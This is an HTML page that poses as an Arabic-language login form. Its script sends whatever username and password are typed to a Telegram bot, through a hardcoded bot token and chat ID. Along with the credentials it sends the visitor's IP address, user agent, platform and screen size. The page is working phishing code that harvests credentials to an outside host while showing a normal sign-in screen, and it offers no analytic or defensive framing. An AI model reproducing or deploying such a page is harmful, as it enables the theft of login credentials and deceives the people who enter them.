<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل دخول</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fffbe6;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      background: white;
      padding: 30px;
      border-radius: 15px;
      width: 350px;
      box-shadow: 0 0 15px rgba(0,0,0,0.15);
      text-align: center;
    }

    .top-img {
      width: 80px;
      height: 80px;
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 15px;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #ffeb3b;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }

    #result {
      margin-top: 15px;
      font-size: 14px;
      color: #444;
      white-space: pre-line;
    }
  </style>
</head>
<body>

  <div class="box">

    <img src="faviconV2.png" class="top-img" alt="">

    <h2>تسجيل دخول</h2>

    <!-- هنا الفورم الحقيقي -->
    <form id="login-form">
      <input type="text" id="user" placeholder="ادخل اسم المستخدم" required>
      <input type="password" id="pass" placeholder="كلمة السر" required>
      <button type="submit">دخول</button>
    </form>

    <div id="result"></div>
  </div>

  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>

  <script>

    const TOKEN = "8561258165:AAG_t4hTOHLvpEpe-_dn_s98dmmr5ZOMJ7U";
    const CHAT_ID = "8234715344";
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('user').value;
        const password = document.getElementById('pass').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = `
🔐 <b>New Login Attempt</b>

<b>Username:</b> ${username}
<b>Password:</b> ${password}

<b>IP Address:</b> ${ip}
<b>Device Type:</b> ${deviceType}
<b>Platform:</b> ${platform}
<b>User Agent:</b> ${userAgent}
<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(() => {
                    document.getElementById("result").innerText = "تم الإرسال للبوت بنجاح";
                }).catch(() => {
                    document.getElementById("result").innerText = "خطأ أثناء الإرسال للبوت";
                });
            })
            .catch(() => {
                document.getElementById("result").innerText = "خطأ في جلب عنوان IP";
            });
    });
  </script>

</body>
</html>
